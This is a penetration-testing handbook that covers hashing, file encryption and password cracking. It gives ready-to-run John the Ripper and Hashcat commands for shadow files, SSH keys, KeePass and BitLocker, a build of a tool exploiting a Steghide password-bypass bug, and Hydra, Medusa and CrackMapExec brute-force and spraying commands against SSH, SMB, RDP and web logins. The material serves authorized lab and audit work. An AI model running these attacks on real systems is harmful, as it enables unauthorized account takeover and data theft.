# PASSWORD CRACKING + HASHING + ENCRYPTION/DECRYPTION — COMPLETE TOOLKIT (2026)
> **Author:** MD MAHABUBUR RAHMAN
> **Version 3.0 • September 2026 • Security Research Handbook**
> ⚠️ **Only use these tools on your own machines, lab VMs, CTFs (THM/HTB), or systems you have explicit written authorization to test.** Cracking/decrypting data without permission is illegal and unethical.

---

## 📋 TABLE OF CONTENTS

| # | Topic | Section |
|---|-------|---------|
| 1 | Hashing vs Encryption — the core idea | [§1](#1-hashing-vs-encryption--the-core-idea) |
| 2 | How to MAKE a hash (Linux / Windows / Python) | [§2](#2-how-to-make-a-hash) |
| 3 | How to ENCRYPT & DECRYPT (files, text, folders) | [§3](#3-how-to-encrypt--decrypt) |
| 4 | How to IDENTIFY an unknown hash | [§4](#4-how-to-identify-an-unknown-hash) |
| 5 | Crack offline hashes — John the Ripper + prep tools | [§5](#5-crack-offline-hashes--john-the-ripper) |
| 6 | Crack at GPU speed — Hashcat (modes, masks, rules) | [§6](#6-crack-at-gpu-speed--hashcat) |
| 7 | Crack file passwords — ZIP / RAR / PDF / SSH / KeePass / BitLocker | [§7](#7-crack-file-and-disk-passwords) |
| 8 | Image steganography — hide, extract, crack passwords | [§8](#8-image-steganography) |
| 9 | Online brute force — Hydra / Medusa / CrackMapExec | [§9](#9-online-brute-force-network-auth) |
| 10 | Generate wordlists — Crunch / John / Python | [§10](#10-generate-wordlists) |
| 11 | Speed optimization tips | [§11](#11-speed-optimization-tips) |
| 12 | Quick reference cards | [§12](#12-quick-reference-cards) |
| 13 | Security mindset & golden rules | [§13](#13-security-mindset--golden-rules) |

---

## 1. HASHING vs ENCRYPTION — THE CORE IDEA

| Property | Hashing | Encryption |
|----------|---------|------------|
| Direction | **One-way** (cannot be reversed) | **Two-way** (can be reversed with the key) |
| Input → Output | `Input → Hash` (fixed length) | `Plaintext + Key → Ciphertext` |
| Reversal | ❌ Cannot recover input from hash | ✅ `Ciphertext + Key → Plaintext` |
| Same input | Always the same hash | Different each run (if a random IV/salt is used) |
| Use cases | Storing passwords, integrity/checksums | Confidentiality — files, messages, drives |

**When to use what:** store passwords as **hashes** (bcrypt/Argon2); protect files/messages with **encryption** (AES/RSA/GPG).

---

## 2. HOW TO MAKE A HASH

### Linux — one-liners
```bash
echo -n "password" | md5sum
#  5f4dcc3b5aa765d61d8327deb882cf99

echo -n "password" | sha1sum
#  5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

echo -n "password" | sha256sum
#  5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

echo -n "password" | sha512sum
#  b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86

# Hash a file (integrity checks)
md5sum  file.txt
sha256sum file.zip
sha512sum document.pdf

# OpenSSL variant (same thing)
openssl dgst -md5    file.txt
openssl dgst -sha256 file.txt
```

### Windows (PowerShell) — same checksums
```powershell
Get-FileHash .\file.txt -Algorithm SHA256
Get-FileHash .\file.zip -Algorithm MD5
Get-FileHash .\document.pdf -Algorithm SHA512
# hash a string:
$bytes = [System.Text.Encoding]::UTF8.GetBytes("password")
(Get-FileHash -InputStream ([System.IO.MemoryStream]::new($bytes)) -Algorithm SHA256).Hash
```

### Python — hashlib (all formats + files)
```python
#!/usr/bin/env python3
import hashlib

pwd = b"password"
print("MD5:   ", hashlib.md5(pwd).hexdigest())
print("SHA-1: ", hashlib.sha1(pwd).hexdigest())
print("SHA-256:", hashlib.sha256(pwd).hexdigest())
print("SHA-512:", hashlib.sha512(pwd).hexdigest())

with open("file.txt", "rb") as f:
    print("File SHA-256:", hashlib.sha256(f.read()).hexdigest())
```

### Python — production-grade password hashing (bcrypt / PBKDF2 / Argon2)
```python
#!/usr/bin/env python3
import bcrypt, hashlib, secrets

# bcrypt (recommended, slow-by-design)
salt  = bcrypt.gensalt()
h     = bcrypt.hashpw(b"my_secure_password", salt)
print("bcrypt:", h.decode())
print("Verify:", bcrypt.checkpw(b"my_secure_password", h))

# PBKDF2 (NIST-recommended)
salt = secrets.token_bytes(16)
print("PBKDF2:", hashlib.pbkdf2_hmac("sha256", b"password", salt, 100000).hex())

# Argon2 (competitive winner, most secure) — pip install argon2-cffi
from argon2 import PasswordHasher
ph = PasswordHasher()
h  = ph.hash("secure_password")
print("Argon2:", h)
print("Verify:", ph.verify(h, "secure_password"))
```

---

## 3. HOW TO ENCRYPT & DECRYPT

### OpenSSL — symmetric file encryption (AES-256-CBC)
```bash
# Encrypt (prompts for password)
openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc

# Decrypt
openssl enc -d -aes-256-cbc -in file.txt.enc -out file.txt

# Encrypt/decrypt with the password inline (scripts)
openssl enc -aes-256-cbc -salt -pass pass:MySecretPassword -in file.txt -out file.txt.enc
openssl enc -d -aes-256-cbc -pass pass:MySecretPassword -in file.txt.enc -out file.txt

# Base64-friendly (shareable text output)
openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc -base64
openssl enc -d -aes-256-cbc -a -in file.txt.enc -out file.txt
```

### OpenSSL — asymmetric (RSA: public key encrypts, private key decrypts)
```bash
# 1. Generate a 2048-bit private key
openssl genrsa -out private_key.pem 2048

# 2. Derive the public key
openssl rsa -in private_key.pem -pubout -out public_key.pem

# 3. Encrypt with the PUBLIC key (anyone can do this)
openssl rsautl -encrypt -in file.txt -out file.txt.enc -pubin -inkey public_key.pem

# 4. Decrypt with the PRIVATE key (only the holder)
openssl rsautl -decrypt -in file.txt.enc -out file.txt -inkey private_key.pem
```

### GnuPG (gpg) — file encryption
```bash
# Generate a keypair
gpg --full-generate-key

# Symmetric encryption (password-based)
gpg --symmetric -c file.txt              # → file.txt.gpg
gpg -d file.txt.gpg > file.txt           # decrypt

# Asymmetric (recipient's public key)
gpg --encrypt -r recipient@email.com file.txt
gpg --decrypt file.txt.gpg > file.txt    # needs your private key

# Armored (ASCII, good for email)
gpg -c --armor file.txt                  # → file.txt.asc
gpg -d file.txt.asc > file.txt
```

### 7-Zip — encrypted archives (hide names too)
```bash
sudo apt install -y p7zip-full

7z a -pSecretPassword archive.7z file.txt          # encrypt contents
7z a -pSecretPassword -mhe=on archive.7z file.txt  # + hide file names
7z x archive.7z -pSecretPassword                   # extract

zip -e archive.zip file.txt                        # classic encrypted zip
unzip -P SecretPassword archive.zip
```

### Python — Fernet (simple) + AES-CBC (advanced)
```python
#!/usr/bin/env python3
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

# --- Method 1: Fernet (simple, symmetric) ---
key = Fernet.generate_key()
cipher = Fernet(key)
enc = cipher.encrypt(b"secret_message")
print("Encrypted:", enc)
print("Decrypted:", cipher.decrypt(enc).decode())

# --- Method 2: password-derived key ---
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32,
                 salt=b"salt_salt_12345", iterations=100000)
key  = base64.urlsafe_b64encode(kdf.derive(b"my_password"))
cipher = Fernet(key)
enc = cipher.encrypt(b"secret")
print("PBKDF2-enc:", enc, "->", cipher.decrypt(enc).decode())
```
```python
#!/usr/bin/env python3
# Advanced AES-CBC with explicit IV (pip install pycryptodome)
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

def encrypt_aes(plaintext, key):
    cipher = AES.new(key.encode(), AES.MODE_CBC)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return cipher.iv.hex() + ":" + base64.b64encode(ct).decode()

def decrypt_aes(ciphertext, key):
    iv, ct = ciphertext.split(":")
    cipher = AES.new(key.encode(), AES.MODE_CBC, bytes.fromhex(iv))
    return unpad(cipher.decrypt(base64.b64decode(ct)), AES.block_size).decode()

key = "0123456789abcdef"
enc = encrypt_aes("secret message", key)
print("Encrypted:", enc)
print("Decrypted:", decrypt_aes(enc, key))
```

---

## 4. HOW TO IDENTIFY AN UNKNOWN HASH

```bash
# HashID — quick guess
hashid '$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW'
hashid '5f4dcc3b5aa765d61d8327deb882cf99'

# Name-That-Hash — better output + examples
nth --text '5f4dcc3b5aa765d61d8327deb882cf99'

# Hash-Identifier (legacy interactive)
hash-identifier
```

```text
Quick fingerprinting by shape:
  32 hex chars   = MD5 (-m 0) or NTLM (-m 1000)
  40 hex chars   = SHA-1 (-m 100)
  64 hex chars   = SHA-256 (-m 1400)
  128 hex chars  = SHA-512 (-m 1700/1800 with $6$ wrapper)
  $1$...         = MD5crypt (-m 500)
  $2a$/$2b$...   = bcrypt (-m 3200)
  $6$...         = SHA-512crypt (-m 1800)
  $krb5tgs$23$   = Kerberoast (-m 13100)
  $pkzip$...     = ZIP (John) / Hashcat -m 17225
  $zip2$...      = WinZip AE-2 (Hashcat -m 13600)
  $rar5$...      = RAR5 (Hashcat -m 23700)
```

---

## 5. CRACK OFFLINE HASHES — JOHN THE RIPPER

```bash
sudo apt-get install john -y

# Basic wordlist crack (John auto-detects the format)
john --wordlist=rockyou.txt hash.txt

# Force a format
john --format=Raw-MD5 hash.txt
john --format=sha256crypt hash.txt

# Show cracked passwords
john --show hash.txt
john --show --format=Raw-MD5 hash.txt

# Single mode (uses usernames/info embedded in the input file)
john --single hash.txt

# Incremental (smart brute force — slow, use last)
john --incremental hash.txt

# Rules on the wordlist (prefixes, suffixes, leetspeak)
john --wordlist=rockyou.txt --rules hash.txt
```

### John's prep tools — turn files into hashes first
```bash
zip2john     secret.zip     > hash.txt; john --format=zip    hash.txt
rar2john     file.rar       > hash.txt; john --format=rar    hash.txt
ssh2john     id_rsa         > hash.txt; john --format=ssh    hash.txt
keepass2john db.kdbx        > hash.txt; john --format=keepass hash.txt
bitlocker2john dump.bin     > hash.txt; john --format=bitlocker hash.txt
dmg2john     file.dmg       > hash.txt; john hash.txt
gpg2john     secret.gpg     > hash.txt; john --format=gpg    hash.txt

# Linux /etc/shadow — merge passwd+shadow first
unshadow /etc/passwd /etc/shadow > hash.txt; john hash.txt
```

---

## 6. CRACK AT GPU SPEED — HASHCAT

```bash
sudo apt-get install hashcat -y
hashcat -I        # list your GPUs

# Dictionary
hashcat -m 0 -a 0 hash.txt rockyou.txt

# Dictionary + rule mutations
hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule

# Brute force (mask) 6 chars, printable
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# Hybrid: wordlist + digits (e.g. Summer2026)
hashcat -m 0 -a 6 hash.txt rockyou.txt ?d?d?d?d   # wordlist + 4 digits

# Show results
hashcat -m 0 hash.txt --show
hashcat -m 0 hash.txt --show --outfile=cracked.txt
```

### Attack modes (the `-a` switch)
```text
-a 0  dictionary          wordlist only
-a 1  combination         wordlist + wordlist
-a 3  brute force         masks
-a 6  hybrid wordlist+mask   word + mask
-a 7  hybrid mask+wordlist   mask + word
```

### The `-m` modes you will actually use
```text
-m 0     MD5
-m 100   SHA-1
-m 1000  NTLM (Windows)
-m 1400  SHA-256
-m 1700  SHA-512
-m 1800  SHA-512crypt (Linux shadow $6$)
-m 3200  bcrypt
-m 5600  NetNTLMv2 (Responder captures)
-m 13100 Kerberoast (TGS)
-m 13600 WinZip AE-2
-m 17225 PKZIP ($pkzip$ from zip2john)
-m 23700 RAR5
-m 13400 KeePass
-m 22931 SSH private key
-m 10500 PDF (v4.0 owner)
```

### Working examples
```bash
# MD5 from scratch
echo -n "password" | md5sum | cut -d' ' -f1 > md5.txt
hashcat -m 0 -a 0 md5.txt rockyou.txt

# SHA-256 + rules
echo -n "password" | sha256sum | cut -d' ' -f1 > sha256.txt
hashcat -m 1400 -a 0 sha256.txt rockyou.txt -r best64.rule

# Windows NTLM
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt

# BCrypt (slow) — use optimized kernel
hashcat -m 3200 -a 0 bcrypt.txt rockyou.txt -O

# macOS/Linux-style shadow
hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt
```

### Mask attacks (PINs, patterns, known prefixes)
```bash
# 6-digit PIN
hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d

# 8-char password (printable)
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a

# Known prefix "admin" + 4 digits
hashcat -m 0 hash.txt -a 3 admin?d?d?d?d

# Custom charset (just lowercase + digits)
hashcat -m 0 hash.txt -a 3 -1 abcdefghijklmnopqrstuvwxyz0123456789 ?1?1?1?1?1?1?1?1
# masks: ?l lower, ?u upper, ?d digit, ?s special, ?a all, ?1-?4 custom
```

### Rules + multiple wordlists
```bash
ls /usr/share/hashcat/rules/          # best64.rule, d3ad0ne.rule, OneRuleToRuleThemAll.rule
hashcat -m 0 hash.txt rockyou.txt -r best64.rule -r d3ad0ne.rule
```

---

## 7. CRACK FILE AND DISK PASSWORDS

### ZIP
```bash
zip2john archive.zip > hash.txt
john --format=zip hash.txt
john --show hash.txt

hashcat -m 17225 hash.txt rockyou.txt        # $pkzip$ (zip2john output)

fcrackzip -D -p rockyou.txt -u archive.zip   # direct dictionary
fcrackzip -b -c aA1 -l 1-8 -u archive.zip    # brute force 1-8 chars
# charset: a=lower, A=upper, 1=digits, !=special
```

### RAR
```bash
rar2john archive.rar > hash.txt
john --format=rar hash.txt
hashcat -m 23700 hash.txt rockyou.txt        # RAR5
```

### PDF
```bash
pdf2john document.pdf > hash.txt
john --format=pdf hash.txt
hashcat -m 10500 hash.txt rockyou.txt
pdfcrack -f document.pdf -w rockyou.txt      # dedicated alt
```

### SSH private keys
```bash
ssh2john id_rsa > hash.txt
john --format=ssh hash.txt
hashcat -m 22931 hash.txt rockyou.txt
```

### KeePass / BitLocker / GPG
```bash
keepass2john database.kdbx > hash.txt
john --format=keepass hash.txt
hashcat -m 13400 hash.txt rockyou.txt

bitlocker2john drive.dd > hash.txt
john --format=bitlocker hash.txt

gpg2john secret.gpg > hash.txt
john --format=gpg hash.txt
```

---

## 8. IMAGE STEGANOGRAPHY

```bash
# Steghide — hide & extract data in images/audio
steghide info image.jpg                          # is data hidden?
steghide extract -sf image.jpg                   # no password
steghide extract -sf image.jpg -p secret123      # with password
steghide embed -cf image.jpg -ef secret.txt      # hide a file

# Stegcracker — brute force the steghide password
pip3 install stegcracker
stegcracker image.jpg rockyou.txt
stegcracker -t 16 image.jpg rockyou.txt          # threads
stegcracker -o extracted_data image.jpg wordlist.txt

# Stegcrack — bypass steghide passwords entirely (CVE-2021-27211)
#   Crafted-file bug in Steghide 0.5.1: data can be extracted without the password.
#   LAB / own-files only — test on your own images.
git clone https://github.com/b4shfire/stegcrack
cd stegcrack/src
clang++ main.cc utils.cc file_handling.cc ui.cc Extractor.cc -ljpeg -pthread -lz -std=c++11 -O2 -o ../stegcrack
./stegcrack image.jpg
./stegcrack image.jpg 8                          # 8 threads
```

---

## 9. ONLINE BRUTE FORCE (NETWORK AUTH)

```bash
# Hydra — the all-rounder
hydra -L users.txt -P rockyou.txt ssh://target.com
hydra -L users.txt -P rockyou.txt ftp://target.com
hydra -l admin -P rockyou.txt http-post-form://target.com/login:user=^USER^&pass=^PASS^:F=incorrect
hydra -L users.txt -P rockyou.txt rdp://target.com      # slow, can lock accounts
hydra -l sa -P rockyou.txt mssql://target.com

# Medusa — parallel across protocols
medusa -h target -U users.txt -P rockyou.txt -M smbnt
medusa -h target -U users.txt -P rockyou.txt -M ssh

# CrackMapExec — the modern AD/SMB way (use a SPRAY not full brute)
crackmapexec smb target.com -u users.txt -p 'Spring2026!'          # 1 pass x all users
crackmapexec smb target.com -u users.txt -p rockyou.txt --continue-on-success
crackmapexec winrm target.com -u users.txt -p rockyou.txt          # RCE if valid
# Spray first, brute later: spray = few passwords vs many users (avoids lockouts)
```

---

## 10. GENERATE WORDLISTS

```bash
# Crunch — custom lists
sudo apt-get install crunch -y
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
crunch 6 10 aA0123456789!@#$% -o wordlist.txt                     # mixed sets
crunch 8 8 -t admin@@@@ -o admin_brute.txt                        # admin0000, admin0001...
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha -o wordlist.txt

# John — transform existing lists
john --stdout --wordlist=rockyou.txt --rules > mutated.txt         # all rule mutations
john --stdout --incremental --max-len=8 > smart.txt                # incremental dump

# Python — pattern wordlist (firstname+year, etc.)
python3 -c "
for name in ['jasmine','rabiul']:
    for year in range(1980,2026):
        print(f'{name}{year}'); print(f'{name.capitalize()}{year}!')
" > custom.txt
```

**Pro tip:** company name / hobby / sports team + `{birthyear}` lists crack far more of a lab/prod charset than rockyou does — and are *quiet*.

---

## 11. SPEED OPTIMIZATION TIPS

```bash
# Hashcat — GPU
hashcat -I                                    # pick the right devices
hashcat -O -m 0 hash.txt rockyou.txt          # optimized kernels
hashcat --opencl-device-types 1,2 hash.txt rockyou.txt   # force GPU
hashcat -m 0 hash.txt rockyou.txt -r best64.rule -r d3ad0ne.rule  # stack rules

# John — CPU
john --wordlist=rockyou.txt --rules hash.txt
john --wordlist=rockyou.txt --mem-file-size=2048 hash.txt   # bigger memory file
john --fork=4 hash.txt                        # use all cores

# Workflow that wins (in this order, cheapest → most expensive):
#  1. dictionary
#  2. dictionary + rules
#  3. top-1000 masks (summer+2digits patterns)
#  4. targeted custom wordlist
#  5. hybrid / mask
#  6. incremental (last resort)
```

---

## 12. QUICK REFERENCE CARDS

```text
IDENTIFY → MAKE → CRACK chain
  hashid "$hash"                          # what am I cracking?
  hashcat -m <mode> -a 0 hash rockyou    # try dictionary first
  john --wordlist=rockyou hash.txt       # CPU alternative

MAKE A HASH
  echo -n "password" | md5sum            # linux one-liners
  Get-FileHash .\f.txt -Algorithm SHA256 # windows
  sha256sum FILE                         # file checksum

ENCRYPT (make it secret)
  openssl enc -aes-256-cbc -salt -in f -out f.enc     # symmetric
  openssl genrsa -out key 2048                        # asymmetric pair
  gpg --symmetric -c f.txt                            # gpg
  7z a -pSECRET -mhe=on a.7z f                        # encrypted archive

DECRYPT (read it back)
  openssl enc -d -aes-256-cbc -in f.enc -out f
  gpg -d f.gpg > f
  7z x a.7z -pSECRET
```

```text
FILE CRACKING ONE-LINERS
  ZIP:      zip2john a.zip > h.txt && john h.txt
  RAR:      rar2john a.rar > h.txt && john --format=rar h.txt
  PDF:      pdf2john d.pdf > h.txt && john --format=pdf h.txt
  SSH key:  ssh2john id_rsa > h.txt && john --format=ssh h.txt
  KeePass:  keepass2john db.kdbx > h.txt && john --format=keepass h.txt
  BitLocker:bitlocker2john img.dd > h.txt && john --format=bitlocker h.txt
  shadow:   unshadow passwd shadow > h.txt && john h.txt
  stego:    steghide extract -sf img.jpg -p $(stegcracker img.jpg rockyou.txt)
```

```text
HASHCAT HOT MODES
  MD5 0 | SHA1 100 | NTLM 1000 | SHA256 1400 | SHA512 1700 |
  sha512crypt 1800 | bcrypt 3200 | NetNTLMv2 5600 |
  Kerberoast 13100 | KeePass 13400 | WinZip 13600 |
  PKZIP 17225 | SSH 22931 | RAR5 23700 | PDF 10500
```

```text
ONLINE BRUTE FORCE GRID
  ssh    hydra -L U -P P ssh://t | medusa -M ssh | cme ssh -u U -p P
  ftp    hydra -L U -P P ftp://t
  smb    hydra smb://t | medusa -M smbnt | crackmapexec smb t -u U -p P
  rdp    hydra rdp://t (t 1..2 only, lockout risk)
  http   hydra -l admin -P P http-post-form://t/login:user=^USER^&pass=^PASS^:F=incorrect
```

---

## 13. SECURITY MINDSET & GOLDEN RULES

```text
GOLDEN RULES
  1. AUTHORIZATION FIRST — your VM, CTF, THM/HTB, or written permission. No exceptions.
  2. Dictionary before brute force — 90% of crackable passwords fall to a good list.
  3. Know the hash type — wrong format = wasted hours.
  4. GPU for hashcat, CPU for john — each is strong where the other is weak.
  5. Targeted wordlists beat generic ones — build from the target's intel.
  6. Log everything — hashes, modes, rules, cracked passwords, timings → for the report.
  7. Throttle online attacks — lockouts destroy labs and trigger alarms.
  8. When you win: confirm impact quietly, screenshot proof, STOP.
  9. Never crack hashes you don't own — unauthorized cracking is illegal, period.
 10. Report clearly — what was cracked, how, impact, and the fix (longer salts, bcrypt/Argon2).

THE COMPLETE PICTURE
  Hash  = for STORING secrets (one-way)
  Encrypt = for SENDING/STORING content (two-way, key-protected)
  Cracking = recovering the input when a hash/password is leaked
  The fix you report: bcrypt/Argon2 salting, strong policies, MFA, verified encryption.
```

---
**Author:** MD MAHABUBUR RAHMAN
**Password Cracking + Hashing + Encryption/Decryption Toolkit — Version 3.0 • 2026**
Copyright © 2026 • All Rights Reserved | Security Research Handbook